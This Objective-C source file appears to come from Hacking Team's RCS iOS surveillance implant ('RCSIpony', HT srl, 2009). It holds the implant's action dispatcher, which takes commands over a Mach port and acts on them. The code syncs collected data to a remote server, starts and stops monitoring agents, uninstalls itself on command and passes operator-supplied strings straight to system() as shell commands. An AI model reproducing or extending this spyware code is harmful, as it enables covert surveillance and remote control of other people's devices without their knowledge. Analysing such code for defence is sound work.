/*
 * RCSIpony - Actions
 *  Provides all the actions which should be triggered upon an Event
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 11/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#import <mach/message.h>

#import "RCSIActions.h"
#import "RCSITaskManager.h"
#import "RESTNetworkProtocol.h"
#import "RCSICommon.h"
#import "RCSIInfoManager.h"
#import <mach/mach.h>

#define DEBUG_
#define JSON_CONFIG

static RCSIActions  *sharedActionManager  = nil;

@implementation RCSIActions

@synthesize notificationPort;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSIActions *)sharedInstance
{
  @synchronized(self)
  {
  if (sharedActionManager == nil)
    {
      [[self alloc] init];
    }
  }
  
  return sharedActionManager;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
  if (sharedActionManager == nil)
    {
      sharedActionManager = [super allocWithZone: aZone];
      return sharedActionManager;
    }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
    if (sharedActionManager != nil)
      {
      self = [super init];
      
      if (self != nil)
        {
          // allocated here and never released: al max count == 0
          mActionsMessageQueue = [[NSMutableArray alloc] initWithCapacity:0];
          notificationPort = nil;
        }
      }
  }
  
  return sharedActionManager;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Action Dispatcher
#pragma mark -

- (void)synched
{
  @synchronized(self)
  {
    if (isSynching == TRUE)
      isSynching = FALSE;
  }
}

- (BOOL)synching
{
  BOOL success = FALSE;
  
  @synchronized(self)
  {
    if (isSynching == FALSE)
      {
        isSynching = TRUE;
        success = TRUE;
      }
  }
  
  return success;
}

- (BOOL)tryTriggerAction:(int)anActionID
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  BOOL concurrent = FALSE;
  
  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
  
  NSArray *configArray = [taskManager getConfigForAction: anActionID withFlag: &concurrent];
  
  if (configArray == nil)
    return FALSE;
  else
    {
      if (concurrent == FALSE)
        [self triggerAction: configArray];
      else
        {
          [NSThread detachNewThreadSelector: @selector(triggerAction:) toTarget:self withObject:configArray];
        }
    }
    
  [pool release];
  
  return TRUE;
}

- (BOOL)triggerAction: (NSArray*)configArray
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
  NSMutableDictionary *configuration;

  for (configuration in configArray)
    {
      int32_t type = [[configuration objectForKey: @"type"] intValue];
      
      switch (type)
        {
          case ACTION_SYNC:
          {
            if ([[configuration objectForKey: @"status"] intValue] == 0)
              {
              if (gAgentCrisis == NO && [self synching] == TRUE) 
                {
                  NSNumber *status = [NSNumber numberWithInt: 1];
                  [configuration setObject: status forKey: @"status"];
                  
                  NSNumber *stop = [configuration objectForKey: @"stop"];
                  
                  BOOL aRetVal = [self actionSync: configuration];
                  
                  // synching done... reset flag
                  [self synched];
                
                  if (aRetVal == TRUE && stop != nil && [stop boolValue] == TRUE)
                    {
                      [configArray release];
                      [pool release];
                      return TRUE;
                    }
                }
              }
            break;
          }
          case ACTION_AGENT_START:
          {    
            if ([[configuration objectForKey: @"status"] intValue] == 0)
              {
                NSNumber *status = [NSNumber numberWithInt: 1];
                [configuration setObject: status forKey: @"status"];

                [self actionAgent: configuration start: TRUE];
                
              }          
            break;
          }
          case ACTION_AGENT_STOP:
          {
            if ([[configuration objectForKey: @"status"] intValue] == 0)
              {
                NSNumber *status = [NSNumber numberWithInt: 1];
                [configuration setObject: status forKey: @"status"];
                
                [self actionAgent: configuration start: FALSE];
              }
            break;
          }
          case ACTION_UNINSTALL:
          {
            if ([[configuration objectForKey: @"status"] intValue] == 0)
              {
                NSNumber *status = [NSNumber numberWithInt: 1];
                [configuration setObject: status forKey: @"status"];

                [self actionUninstall: configuration];
              }          
            break;
          }
          case ACTION_INFO:
          {
            if ([[configuration objectForKey: @"status"] intValue] == 0)
              {
                NSNumber *status = [NSNumber numberWithInt: 1];
                [configuration setObject: status forKey: @"status"];
                
                [self actionInfo: configuration];
                
                status = [NSNumber numberWithInt: 0];
                [configuration setObject: status forKey: @"status"];
              }
            break;
          }
          case ACTION_COMMAND:
          {
          if ([[configuration objectForKey: @"status"] intValue] == 0)
            {
              NSNumber *status = [NSNumber numberWithInt: 1];
              [configuration setObject: status forKey: @"status"];
           
              [self actionLaunchCommand: configuration];
              
              status = [NSNumber numberWithInt: 0];
              [configuration setObject: status forKey: @"status"];
            }
            break;
          }
          case ACTION_EVENT:
          {
            if ([[configuration objectForKey: @"status"] intValue] == 0)
              {
                NSNumber *status = [NSNumber numberWithInt: 1];
                [configuration setObject: status forKey: @"status"];
                
                [self actionEvent: configuration];
                
                status = [NSNumber numberWithInt: 0];
                [configuration setObject: status forKey: @"status"];
              }
            
            break;
          }
          default:
          {
            break;
          }
        }
    }
  
  // retain by getConfigForAction
  [configArray release];
  
  [pool release];
  
  return TRUE;
}

///////////////////////////////////////////////////

#pragma mark -
#pragma mark Actions
#pragma mark -

///////////////////////////////////////////////////

- (BOOL)actionSync: (NSMutableDictionary *)aConfiguration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  BOOL aRetVal = TRUE;
  
  [aConfiguration retain];

  NSData *syncConfig = [aConfiguration objectForKey: @"data"];
  
  // play sound in demo mode
  checkAndRunDemoMode();
  
  RESTNetworkProtocol *protocol = [[RESTNetworkProtocol alloc]
                                   initWithConfiguration: syncConfig
                                                 andType: ACTION_SYNC];

  if ([protocol perform] == NO)
    {
      aRetVal = FALSE;
    }
  
  NSNumber *status = [NSNumber numberWithInt: 0];
  [aConfiguration setObject: status forKey: @"status"];

  [protocol release];  
  [aConfiguration release];
  [outerPool release];
  
  return aRetVal;
}

#if 0
- (BOOL)actionSyncAPN: (NSMutableDictionary *)aConfiguration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  [aConfiguration retain];

  NSData *syncConfig = [[aConfiguration objectForKey: @"data"] retain];
  RESTNetworkProtocol *protocol = [[RESTNetworkProtocol alloc]
                                   initWithConfiguration: syncConfig
                                                 andType: ACTION_SYNC_APN];

  if ([protocol perform] == NO)
    {
#ifdef DEBUG_ACTIONS
      errorLog(@"An error occurred while syncing over APN with REST proto");
#endif
    }
  else
    {
      BOOL bSuccess = NO;
      
      RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
      
      NSMutableDictionary *agentConfiguration = [taskManager getConfigForAgent: AGENT_DEVICE];
      
      deviceStruct *tmpDevice = 
      (deviceStruct*)[[agentConfiguration objectForKey: @"data"] bytes];
      
      if (tmpDevice != nil &&
          tmpDevice->isEnabled == AGENT_DEV_ENABLED)
        {          
          bSuccess = [taskManager startAgent: AGENT_DEVICE];
          
#ifdef DEBUG
          NSLog(@"%s: sync performed... restarting DEVICE Agent %d", __FUNCTION__, bSuccess);
#endif
        }
      else
        {
#ifdef DEBUG
          NSLog(@"%s: sync performed... DEVICE Agent dont restarted", __FUNCTION__);
#endif
        }
    }
  
  NSNumber *status = [NSNumber numberWithInt: 0];
  [aConfiguration setObject: status forKey: @"status"];

  [protocol release];  
  [aConfiguration release];
  [outerPool release];
  
  return YES;
}
#endif

- (BOOL)actionAgent: (NSMutableDictionary *)aConfiguration start: (BOOL)aFlag
{
  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];

  [aConfiguration retain];
  
  //
  // Start/Stop Agent actions got the agentID inside the additional Data
  //
  u_int agentID = 0;
  [[aConfiguration objectForKey: @"data"] getBytes: &agentID];
  
  if (aFlag == TRUE)
    {
#ifdef DEBUG
      NSLog(@"%s: start agent %#x", __FUNCTION__, agentID);
#endif
      [taskManager startAgent: agentID];
    }
   else
    {
#ifdef DEBUG
      NSLog(@"%s: stop agent %#x", __FUNCTION__, agentID);
#endif
     [taskManager stopAgent: agentID];
    }
  NSNumber *status = [NSNumber numberWithInt: 0];
  [aConfiguration setObject: status forKey: @"status"];
  
  return TRUE;
}

- (BOOL)actionLaunchCommand: (NSMutableDictionary *)aConfiguration
{
  NSData *conf = [aConfiguration objectForKey: @"data"];
  NSString *cmdStr = [[NSString alloc] initWithBytes: [conf bytes] length: [conf length] encoding:NSUTF8StringEncoding];
  
  char *commandBuff = (char*)[cmdStr cStringUsingEncoding: NSUTF8StringEncoding];
  
  if (commandBuff != NULL)
    system(commandBuff);
  
  [cmdStr release];
  
  NSNumber *status = [NSNumber numberWithInt: 0];
  [aConfiguration setObject: status forKey: @"status"];
  
  return TRUE;
}

- (BOOL)actionUninstall: (NSMutableDictionary *)aConfiguration
{
  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
  [aConfiguration retain];
  
#ifdef DEBUG
  NSLog(@"Action Uninstall started!");
#endif
  
  [taskManager uninstallMeh];
  
  NSNumber *status = [NSNumber numberWithInt: 0];
  [aConfiguration setObject: status forKey: @"status"];
  
  return TRUE;
}

- (BOOL)actionInfo: (NSMutableDictionary *)aConfiguration
{
  RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
  [aConfiguration retain];

  NSData *conf = [aConfiguration objectForKey: @"data"];
  
#ifdef DEBUG
  NSLog(@"Action Info started: %@", [aConfiguration objectForKey: @"data"]);
#endif

  int32_t len = 0;
  NSData *stringData;
  
  [conf getBytes: &len
          length: sizeof(int32_t)];
  
  @try
    {
      stringData = [conf subdataWithRange: NSMakeRange(sizeof(int32_t), len)];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG
      NSLog(@"exception on makerange (%@)", [e reason]);
#endif

      [aConfiguration release];
      return NO;
    }
    
  NSString *text = [[NSString alloc] initWithData: stringData
                                         encoding: NSUTF16LittleEndianStringEncoding];
  
  [infoManager logActionWithDescription: text];
  
  [text release];
  [aConfiguration release];
  [infoManager release];

  return TRUE;
}

typedef struct {
  UInt32 enabled;
  UInt32 event;
} action_event_t;

// FIXED-
- (BOOL)actionEvent: (NSMutableDictionary *)aConfiguration
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSNumber *newStatus;
  action_event_t *event;
  
  [aConfiguration retain];
  
  event = (action_event_t*)[[aConfiguration objectForKey: @"data"] bytes];
  
  if (event != nil)
    {
      if (event->enabled == TRUE) 
        newStatus = [NSNumber numberWithInt: 1];
      else
        newStatus = [NSNumber numberWithInt: 0];
      
      NSMutableDictionary *anEvent = 
      [[[RCSITaskManager sharedInstance] mEventsList] objectAtIndex: event->event];
      
      id anObject = [anEvent objectForKey: @"object"];
      
      if (anObject != nil)
        {
          @synchronized(anObject)
          {  
            if ([anObject respondsToSelector: @selector(setEnabled:)] == YES)
              [anObject performSelector:@selector(setEnabled:) withObject:newStatus];
          }
        }
    }
  
  [aConfiguration release];
  
  [pool release];
  
  return TRUE;
}

///////////////////////////////////////////////////

#pragma mark -
#pragma mark Main runloop
#pragma mark -

///////////////////////////////////////////////////

typedef struct _coreMessage_t
{
  mach_msg_header_t header;
  uint dataLen;
} coreMessage_t;


- (BOOL)addMessage: (NSData*)aMessage
{
  // messages removed by handleMachMessage
  @synchronized(mActionsMessageQueue)
  {
    [mActionsMessageQueue addObject: aMessage];
  }
  
  return TRUE;
}

// handle the incomings events
- (void) handleMachMessage:(void *) msg 
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  coreMessage_t *coreMsg = (coreMessage_t*)msg;
  
  NSData *theData = [NSData dataWithBytes: ((u_char*)msg + sizeof(coreMessage_t))  
                                   length: coreMsg->dataLen];
  
  [self addMessage: theData];
  
  [pool release];
}

- (BOOL)processAction:(NSData *)aData
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  int actionID = 0xFFFFFFFF;
  
  if (aData == nil)
    return FALSE;
  
  memcpy(&actionID, [aData bytes], sizeof(int));
  
  [self tryTriggerAction: actionID];
  
  [pool release];
  
  return TRUE;
}

// Process new incoming events
-(int)processIncomingActions
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableArray *tmpMessages;
  
  @synchronized(mActionsMessageQueue)
  {
    tmpMessages = [[mActionsMessageQueue copy] autorelease];
    [mActionsMessageQueue removeAllObjects];
  }
  
#ifdef DEBUG
  NSLog(@"%s: process messages %d", __FUNCTION__, [tmpMessages count]);
#endif  
  
  int logCount = [tmpMessages count];
  
  for (int i=0; i < logCount; i++)
    {
      [self processAction: [tmpMessages objectAtIndex:i]];
    }
  
  [pool release];
  
  return logCount;
}

NSString *kRunLoopActionManagerMode = @"kRunLoopActionManagerMode";

- (void)actionManagerRunLoop
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  while (actionManagerStatus == ACTION_MANAGER_RUNNING &&
         actionManagerStatus == ACTION_MANAGER_STOPPING)
    { 
#ifdef DEBUG
      NSLog(@"%s: actionManagerRunLoop found alredy running", __FUNCTION__);
#endif
      sleep(1);
    }
    
  actionManagerStatus = ACTION_MANAGER_RUNNING;

  NSRunLoop *actionManagerRunLoop = [NSRunLoop currentRunLoop];
  
  notificationPort = [[NSMachPort alloc] init];
  [notificationPort setDelegate: self];
  
  [actionManagerRunLoop addPort: notificationPort 
                        forMode: kRunLoopActionManagerMode];
  
  // run the log loop: event send notification to this
  while (actionManagerStatus == ACTION_MANAGER_RUNNING)
    {
      NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
      
      [actionManagerRunLoop runMode: kRunLoopActionManagerMode 
                         beforeDate: [NSDate dateWithTimeIntervalSinceNow:0.750]];
      
      // process incoming logs out of the runloop
      [self processIncomingActions];   
      
      [pool release];
    }
  
  // remove source port, release machport, remove action queue
  [actionManagerRunLoop removePort: notificationPort 
                           forMode: kRunLoopActionManagerMode];
  
  [notificationPort release];
  notificationPort = nil;
  
  @synchronized(mActionsMessageQueue)
  {
    [mActionsMessageQueue removeAllObjects];
  }
  
  // work is done: stop the manager
  actionManagerStatus = ACTION_MANAGER_STOPPED;
  
  [pool release];
}

- (void)start
{  
  [NSThread detachNewThreadSelector: @selector(actionManagerRunLoop) 
                           toTarget: self withObject:nil];
}

// Excecuted by another thread
- (BOOL)stop
{
  actionManagerStatus = ACTION_MANAGER_STOPPING;
  
  for (int i=0; i<5; i++) 
  { 
    if (actionManagerStatus == ACTION_MANAGER_STOPPED)
      break;
    sleep(1);
  }

  return actionManagerStatus == ACTION_MANAGER_STOPPED ? TRUE : FALSE;
}

///////////////////////////////////////////////////

@end
